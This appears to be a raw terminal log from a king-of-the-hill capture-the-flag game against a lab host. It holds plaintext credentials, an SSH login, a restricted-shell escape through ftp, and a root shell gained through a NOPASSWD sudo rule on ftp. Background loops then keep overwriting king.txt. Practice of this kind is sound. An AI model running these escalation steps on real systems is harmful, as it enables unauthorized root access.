web po:password1
ssh shifu:badman

┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 58:8a:5a:0e:50:e3  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.39  netmask 255.255.254.0  destination 10.10.16.39
        inet6 fe80::aa89:abe9:808a:2f28  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:4::1025  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 102  bytes 6936 (6.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 118  bytes 4800 (4.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.4.62.198  netmask 255.255.128.0  destination 10.4.62.198
        inet6 fe80::d1d2:6a10:1d0c:4a7d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 156 (156.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 252 (252.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.43.77  netmask 255.255.255.0  broadcast 192.168.43.255
        inet6 fe80::8794:a1f9:c853:7678  prefixlen 64  scopeid 0x20<link>
        ether 44:03:2c:a3:57:1e  txqueuelen 1000  (Ethernet)
        RX packets 164485  bytes 149598021 (142.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 111446  bytes 21110501 (20.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# 
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# nc -nlvp 1234                                          
listening on [any] 1234 ...
connect to [10.4.62.198] from (UNKNOWN) [10.10.131.192] 52684
                                                                                                                                                   
┌──(root㉿kali)-[~]
┌──(root㉿kali)-[~]
└─# ps aux | grep tun     
root      180749  0.0  0.0   6432  1920 pts/0    S+   19:33   0:00 grep --color=auto tun
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep tun0
root      181020  0.0  0.0   6432  2048 pts/0    S+   19:34   0:00 grep --color=auto tun0
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo ip link set tun0 down
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 58:8a:5a:0e:50:e3  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.4.62.198  netmask 255.255.128.0  destination 10.4.62.198
        inet6 fe80::d1d2:6a10:1d0c:4a7d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 47  bytes 4188 (4.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 62  bytes 23974 (23.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.43.77  netmask 255.255.255.0  broadcast 192.168.43.255
        inet6 fe80::8794:a1f9:c853:7678  prefixlen 64  scopeid 0x20<link>
        ether 44:03:2c:a3:57:1e  txqueuelen 1000  (Ethernet)
        RX packets 181674  bytes 165091535 (157.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 121205  bytes 23061491 (21.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo ip link delete tun0
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn   

root       30964  0.2  0.2  13816  8192 ?        R    14:35   0:42 openvpn /home/kali/Downloads/starting_point_cyberthirty30.ovpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182569  0.0  0.0   6432  2048 pts/0    S+   19:37   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn

root       30964  0.3  0.2  13816  8192 ?        R    14:35   0:58 openvpn /home/kali/Downloads/starting_point_cyberthirty30.ovpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182700  0.0  0.0   6432  2176 pts/0    S+   19:37   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 30964
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# ps aux | grep openvpn
root      167415  0.1  0.2  13688  9600 ?        S    19:07   0:02 openvpn /home/kali/Downloads/cyber30.ovpn
root      182928  0.0  0.0   6432  2048 pts/0    S+   19:38   0:00 grep --color=auto openvpn
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 167415  
                                                                                                                                                   
┌──(root㉿kali)-[~]
└─# sudo kill -9 182928                                        
kill: (182928): No such process
                                                                                                                                                   
┌──(root㉿kali)-[~]
┌──(root㉿kali)-[~]
└─# nano /etc/hosts
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# smbclient -L \\\\10.10.132.160    
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_CONNECTION_DISCONNECTED
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# ping 10.10.132.160   
PING 10.10.132.160 (10.10.132.160) 56(84) bytes of data.
64 bytes from 10.10.132.160: icmp_seq=1 ttl=61 time=739 ms
64 bytes from 10.10.132.160: icmp_seq=2 ttl=61 time=740 ms
64 bytes from 10.10.132.160: icmp_seq=3 ttl=61 time=792 ms
^C
--- 10.10.132.160 ping statistics ---
4 packets transmitted, 3 received, 25% packet loss, time 3000ms
rtt min/avg/max/mdev = 739.435/756.982/792.003/24.763 ms
                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# ssh shifu@10.10.132.160       
The authenticity of host '10.10.132.160 (10.10.132.160)' can't be established.
ED25519 key fingerprint is SHA256:8YIbia3DtzTm9rElf3yLUwoa07R7AEQ7WWARx3D6HYY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.160' (ED25519) to the list of known hosts.
shifu@10.10.132.160's password: 
Last login: Wed Oct  2 14:27:12 2024 from ip-10-17-68-193.eu-west-1.compute.internal
[shifu@panda ~]$ ftp
ftp> !/bin/sh
sh-4.2$ ls
flag.txt
sh-4.2$ echo cyber30 >/root/king.txt
sh: /root/king.txt: Permission denied
sh-4.2$ echo cyber30 >>/root/king.txt
sh: /root/king.txt: Permission denied
sh-4.2$ cat flag.txt
YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
sh-4.2$ cd /
sh-4.2$ ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
sh-4.2$ cd root
sh: cd: root: Permission denied
sh-4.2$ chattr -i root
sh: /usr/bin/chattr: Permission denied
sh-4.2$ nano /etc/sudoers
sh: nano: command not found
sh-4.2$ sudo
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...
sh-4.2$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for shifu: 
Sorry, try again.
[sudo] password for shifu: 
Sorry, try again.
[sudo] password for shifu: 
sudo: 3 incorrect password attempts
sh-4.2$ sudo -l
Matching Defaults entries for shifu on panda:
    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User shifu may run the following commands on panda:
    (root) NOPASSWD: /usr/bin/ftp
sh-4.2$ id
uid=1001(shifu) gid=1001(shifu) groups=1001(shifu)
sh-4.2$ sudo ftp
ftp> !/bin/sh
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cd root
sh-4.2# ls
king.txt  koth
sh-4.2# chattr -i king.txt
sh: /bin/chattr: Permission denied
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat cyber30
cat: cyber30: No such file or directory
sh-4.2# cat king.txt
cyber30
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat king.txt
cyber30
sh-4.2# ( while true; do echo cyber30 > king.txt; sleep 0.2; done ) &
[1] 2063
sh-4.2# cat king.txt
cyber30
sh-4.2# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 125344  3828 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    14:26   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    14:26   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    14:26   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    14:26   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        R    14:26   0:00 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   14:26   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    14:26   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    14:26   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   14:26   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    14:26   0:00 [xenwatch]
root        16  0.0  0.0      0     0 ?        S    14:26   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    14:26   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S<   14:26   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S<   14:26   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root        22  0.0  0.0      0     0 ?        S<   14:26   0:00 [kblockd]
root        23  0.0  0.0      0     0 ?        S<   14:26   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   14:26   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        S    14:26   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        SN   14:26   0:00 [ksmd]
root        31  0.0  0.0      0     0 ?        SN   14:26   0:00 [khugepaged]
root        32  0.0  0.0      0     0 ?        S<   14:26   0:00 [crypto]
root        40  0.0  0.0      0     0 ?        S<   14:26   0:00 [kthrotld]
root        42  0.0  0.0      0     0 ?        S<   14:26   0:00 [kmpath_rdacd]
root        43  0.0  0.0      0     0 ?        S<   14:26   0:00 [kaluad]
root        44  0.0  0.0      0     0 ?        S<   14:26   0:00 [kpsmoused]
root        46  0.0  0.0      0     0 ?        S<   14:26   0:00 [ipv6_addrconf]
root        59  0.0  0.0      0     0 ?        S<   14:26   0:00 [deferwq]
root        90  0.0  0.0      0     0 ?        S    14:26   0:00 [kauditd]
root       269  0.0  0.0      0     0 ?        S<   14:26   0:00 [ata_sff]
root       273  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_0]
root       274  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_0]
root       275  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_1]
root       276  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_1]
root       277  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:3]
root       341  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       342  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       352  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       353  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       365  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       366  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfsalloc]
root       367  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs_mru_cache]
root       368  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/dm-0]
root       369  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/dm-0]
root       370  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/dm-0]
root       371  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/dm-0]
root       372  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/dm-]
root       373  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/dm-0]
root       374  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/d]
root       375  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/dm-0]
root       376  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:1H]
root       443  0.0  0.1  39240  2856 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-journald
root       466  0.0  0.0 190372  1344 ?        Ss   14:26   0:00 /usr/sbin/lvmetad -f
root       474  0.0  0.1  44328  1904 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-udevd
root       534  0.0  0.0      0     0 ?        S<   14:26   0:00 [ttm_swap]
root       546  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/xvda1]
root       547  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/xvda1]
root       548  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/xvda1]
root       549  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/xvda1]
root       550  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/xvd]
root       551  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/xvda1]
root       552  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/x]
root       553  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/xvda1]
root       569  0.0  0.0  55516   888 ?        S<sl 14:26   0:00 /sbin/auditd
root       593  0.0  0.5 746024 10672 ?        Ssl  14:26   0:00 /root/koth
polkitd    597  0.0  0.6 538512 13104 ?        Ssl  14:26   0:00 /usr/lib/polkit-1/polkitd --no-debug
dbus       601  0.0  0.1  58240  2472 ?        Ss   14:26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-act
chrony     614  0.0  0.0 117796  1716 ?        S    14:26   0:00 /usr/sbin/chronyd
root       616  0.0  0.5 478316 10720 ?        Ssl  14:26   0:00 /usr/sbin/NetworkManager --no-daemon
root       617  0.0  0.0  26380  1764 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-logind
root       619  0.0  0.0 126292  1588 ?        Ss   14:26   0:00 /usr/sbin/crond -n
root       853  0.0  0.1 102816  2364 ?        Ss   14:26   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclie
root       910  0.0  1.0 573896 19200 ?        Ssl  14:26   0:00 /usr/bin/python -Es /usr/sbin/tuned -l -P
root       913  0.0  0.6 356636 11996 ?        Ss   14:26   0:00 php-fpm: master process (/etc/php-fpm.conf)
root       925  0.0  0.2 112840  4292 ?        Ss   14:26   0:00 /usr/sbin/sshd -D
root       927  0.0  0.2 222760  4516 ?        Ssl  14:26   0:00 /usr/sbin/rsyslogd -n
root       929  0.0  0.3 353308  6872 ?        Ss   14:26   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       933  0.0  0.0 110108   856 tty1     Ss+  14:26   0:00 /sbin/agetty --noclear tty1 linux
root       934  0.0  0.0 110108   864 ttyS0    Ss+  14:26   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
po        1061  0.9  8.7 2539780 165360 ?      Sl   14:26   0:13 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -
named     1068  0.0  3.0 167812 57620 ?        Ssl  14:26   0:00 /usr/sbin/named -u named -c /etc/named.conf
root      1123  0.0  0.8 430424 15484 ?        Ss   14:26   0:00 /usr/sbin/httpd -DFOREGROUND
mysql     1136  0.0  0.0 113312  1600 ?        Ss   14:26   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
mysql     1299  0.0  4.9 1102652 93180 ?       Sl   14:26   0:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64
root      1340  0.0  0.1  89620  2092 ?        Ss   14:26   0:00 /usr/libexec/postfix/master -w
postfix   1341  0.0  0.2  89724  4056 ?        S    14:26   0:00 pickup -l -t unix -u
postfix   1342  0.0  0.2  89792  4084 ?        S    14:26   0:00 qmgr -l -t unix -u
root      1356  0.0  0.6 424844 11636 ?        Ss   14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
po        1357  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1358  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1359  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1360  0.0  0.3 356636  6020 ?        S    14:26   0:00 php-fpm: pool www
po        1361  0.0  0.3 356636  6024 ?        S    14:26   0:00 php-fpm: pool www
shifu     1388  0.0  1.3 516088 24656 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1389  0.0  1.2 441020 22620 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1391  0.0  1.6 523364 31836 ?        S    14:26   0:00 /usr/sbin/httpd -DFOREGROUND
root      1401  0.0  0.1 120884  2120 ?        Ss   14:26   0:00 nginx: master process /usr/sbin/nginx
nginx     1402  0.0  0.1 121288  3580 ?        S    14:26   0:00 nginx: worker process
root      1577  0.0  0.1 419748  3116 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1578  0.0  0.1 420204  3164 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1647  0.0  0.1 424828  3200 ?        S    14:26   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1698  0.0  0.3 159308  6040 ?        Ss   14:27   0:00 sshd: shifu [priv]
shifu     1704  0.0  0.1 159308  2424 ?        S    14:27   0:00 sshd: shifu@pts/0
shifu     1708  0.0  0.1 115444  2032 pts/0    Ss   14:27   0:00 -rbash
root      1728  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh ; -quit
shifu     1729  0.0  0.0 115440  1828 pts/0    S    14:27   0:00 /bin/sh
root      1732  0.0  0.0 120368  1012 pts/0    S    14:27   0:00 find . -exec /bin/sh -p ; -quit
root      1733  0.0  0.1 115444  1912 pts/0    S+   14:27   0:00 /bin/sh -p
shifu     1740  0.0  0.6 431424 12892 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1747  0.0  1.1 513284 21780 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1751  0.0  0.9 510540 18804 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1759  0.0  1.6 523336 31680 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1762  0.0  0.9 436032 17508 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1764  0.0  0.4 430424  8824 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
shifu     1766  0.0  0.9 510540 18788 ?        S    14:27   0:00 /usr/sbin/httpd -DFOREGROUND
root      1846  0.0  0.0      0     0 ?        S    14:31   0:00 [kworker/0:0]
root      1848  0.0  1.4 437612 27900 pts/0    T    14:31   0:00 /usr/bin/python /usr/bin/yum install kernel-devel-3.10.0-862.el7.x86_64
root      1916  0.0  0.3 159308  6248 ?        Ss   14:36   0:00 sshd: shifu [priv]
shifu     1918  0.0  0.1 159308  2432 ?        S    14:36   0:00 sshd: shifu@pts/1
shifu     1919  0.0  0.1 115444  2012 pts/1    Ss   14:36   0:00 -rbash
root      1938  0.0  0.0      0     0 ?        S    14:36   0:00 [kworker/0:2]
shifu     1964  0.0  0.0 119052  1524 pts/1    S    14:39   0:00 ftp
shifu     1965  0.0  0.1 115440  1888 pts/1    S    14:39   0:00 /bin/sh
root      1999  0.0  0.0      0     0 ?        R    14:41   0:00 [kworker/0:1]
root      2026  0.0  0.2 218524  4020 pts/1    S    14:44   0:00 sudo ftp
root      2027  0.0  0.0 119052  1524 pts/1    S    14:44   0:00 ftp
root      2033  0.0  0.0 115444  1880 pts/1    S    14:45   0:00 /bin/sh
root      2063  0.1  0.0 115444   804 pts/1    S    14:49   0:00 /bin/sh
root      2150  0.0  0.0 107956   356 pts/1    S    14:49   0:00 sleep 0.2
root      2151  0.0  0.0 155372  1876 pts/1    R+   14:49   0:00 ps aux
sh-4.2# chattr
sh: /bin/chattr: Permission denied
sh-4.2# ( while true; do echo cyber30 > king.txt; sleep 0.1; done ) &
[2] 2615
sh-4.2# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 125344  3828 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    14:26   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    14:26   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    14:26   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    14:26   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        R    14:26   0:00 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   14:26   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    14:26   0:00 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    14:26   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   14:26   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    14:26   0:00 [xenwatch]
root        16  0.0  0.0      0     0 ?        S    14:26   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    14:26   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S<   14:26   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S<   14:26   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root        22  0.0  0.0      0     0 ?        S<   14:26   0:00 [kblockd]
root        23  0.0  0.0      0     0 ?        S<   14:26   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   14:26   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        S    14:26   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        SN   14:26   0:00 [ksmd]
root        31  0.0  0.0      0     0 ?        SN   14:26   0:00 [khugepaged]
root        32  0.0  0.0      0     0 ?        S<   14:26   0:00 [crypto]
root        40  0.0  0.0      0     0 ?        S<   14:26   0:00 [kthrotld]
root        42  0.0  0.0      0     0 ?        S<   14:26   0:00 [kmpath_rdacd]
root        43  0.0  0.0      0     0 ?        S<   14:26   0:00 [kaluad]
root        44  0.0  0.0      0     0 ?        S<   14:26   0:00 [kpsmoused]
root        46  0.0  0.0      0     0 ?        S<   14:26   0:00 [ipv6_addrconf]
root        59  0.0  0.0      0     0 ?        S<   14:26   0:00 [deferwq]
root        90  0.0  0.0      0     0 ?        S    14:26   0:00 [kauditd]
root       269  0.0  0.0      0     0 ?        S<   14:26   0:00 [ata_sff]
root       273  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_0]
root       274  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_0]
root       275  0.0  0.0      0     0 ?        S    14:26   0:00 [scsi_eh_1]
root       276  0.0  0.0      0     0 ?        S<   14:26   0:00 [scsi_tmf_1]
root       277  0.0  0.0      0     0 ?        S    14:26   0:00 [kworker/u30:3]
root       341  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       342  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       352  0.0  0.0      0     0 ?        S<   14:26   0:00 [kdmflush]
root       353  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       365  0.0  0.0      0     0 ?        S<   14:26   0:00 [bioset]
root       366  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfsalloc]
root       367  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs_mru_cache]
root       368  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/dm-0]
root       369  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/dm-0]
root       370  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/dm-0]
root       371  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/dm-0]
root       372  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/dm-]
root       373  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/dm-0]
root       374  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/d]
root       375  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/dm-0]
root       376  0.0  0.0      0     0 ?        S<   14:26   0:00 [kworker/0:1H]
root       443  0.0  0.1  39240  2868 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-journald
root       466  0.0  0.0 190372  1344 ?        Ss   14:26   0:00 /usr/sbin/lvmetad -f
root       474  0.0  0.1  44328  1904 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-udevd
root       534  0.0  0.0      0     0 ?        S<   14:26   0:00 [ttm_swap]
root       546  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-buf/xvda1]
root       547  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-data/xvda1]
root       548  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-conv/xvda1]
root       549  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-cil/xvda1]
root       550  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-reclaim/xvd]
root       551  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-log/xvda1]
root       552  0.0  0.0      0     0 ?        S<   14:26   0:00 [xfs-eofblocks/x]
root       553  0.0  0.0      0     0 ?        S    14:26   0:00 [xfsaild/xvda1]
root       569  0.0  0.0  55516   888 ?        S<sl 14:26   0:00 /sbin/auditd
root       593  0.0  0.5 746024 10672 ?        Ssl  14:26   0:00 /root/koth
polkitd    597  0.0  0.6 538512 13104 ?        Ssl  14:26   0:00 /usr/lib/polkit-1/polkitd --no-debug
dbus       601  0.0  0.1  58240  2472 ?        Ss   14:26   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-act
chrony     614  0.0  0.0 117796  1716 ?        S    14:26   0:00 /usr/sbin/chronyd
root       616  0.0  0.5 478316 10720 ?        Ssl  14:26   0:00 /usr/sbin/NetworkManager --no-daemon
root       617  0.0  0.0  26380  1764 ?        Ss   14:26   0:00 /usr/lib/systemd/systemd-logind
root       619  0.0  0.0 126292  1588 ?        Ss   14:26   0:00 /usr/sbin/crond -n
